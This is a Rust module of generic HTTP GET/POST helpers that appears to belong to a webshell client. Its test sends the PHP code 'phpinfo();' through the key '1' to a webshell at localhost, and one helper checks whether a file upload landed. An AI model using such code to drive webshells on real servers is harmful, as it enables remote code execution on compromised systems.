use reqwest::{self, Client};
use std::collections::HashMap;
use url::Url;

pub async fn get_with_key<T: AsRef<str>, E: AsRef<str>, U: AsRef<str>>(
    url: T,
    key: E,
    value: U,
    client: &Client,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut url = Url::parse(url.as_ref())?;
    url.query_pairs_mut()
        .append_pair(key.as_ref(), value.as_ref());

    let res = client.get(url).send().await?;

    // println!("{}", res.text().await?);
    Ok(res.text().await?)
}

pub async fn post_with_key<T: AsRef<str>, E: AsRef<str>, U: AsRef<str>>(
    url: T,
    key: E,
    value: U,
    client: &Client,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut date = HashMap::new();
    date.insert(key.as_ref(), value.as_ref());

    let encoded_data = serde_urlencoded::to_string(&date)?;
    // println!("encoded_data: {:?}", encoded_data);

    let res = client
        .post(url.as_ref())
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(encoded_data)
        .send()
        .await?;

    if !res.status().is_success() {
        println!("POST 请求失败: {}", res.status());
    }

    Ok(res.text().await?)
}

///# Example
/// ```
/// let url = "https://example.com/api";
/// let mut params = HashMap::new();
/// params.insert("key1", "value1");
/// params.insert("key2", "value2");
/// let client = Client::new();
/// let response = post_request(&client, url, params).await?;
/// println!("Response: {}", response);
/// ```
pub async fn post_request(
    client: &Client,
    url: &str,
    params: HashMap<&str, &str>,
) -> Result<String, reqwest::Error> {
    let res = client.post(url).form(&params).send().await?;

    let body = res.text().await?;
    Ok(body)
}

pub async fn is_url_return_ok(url: &str, client: &Client) -> bool {
    let response = client.get(url).send().await;
    response.is_ok()
}

/// Deal with url for function `is_url_return_ok` when using function `file_upload`.
/// It is just for checking file upload success or not.
/// # Example
/// ```
///let url = "http://127.0.0.1/foo/bar.php?d=1234";
///let filename = "4321";
///if let Some(new_url) = modify_url(url, filename) {
///    println!("Modified URL: {}", new_url);
///} else {
///    println!("Error processing URL");
///}
/// ```
pub fn modify_url(url: &str, filename: &str) -> Option<String> {
    // 忽略 '?' 以后的内容
    let base_url = url.split('?').next()?;

    // 忽略最后一个斜杠 '/' 后的文件名
    let base_path = std::path::Path::new(base_url).parent()?.to_str()?;

    // 加上新的文件名
    let new_url = format!("{}/{}", base_path, filename);

    Some(new_url)
}

#[cfg(test)]
mod tests {
    use super::*;
    use reqwest::Client;

    const URL: &str = "http://127.0.0.1/webshell.php";
    const KEY: &str = "1";

    #[tokio::test]
    async fn test_get() {
        let client = Client::new();
        let res = get_with_key(URL, KEY, "phpinfo();", &client).await.unwrap();
        println!("res: {:?}", res);
    }
}
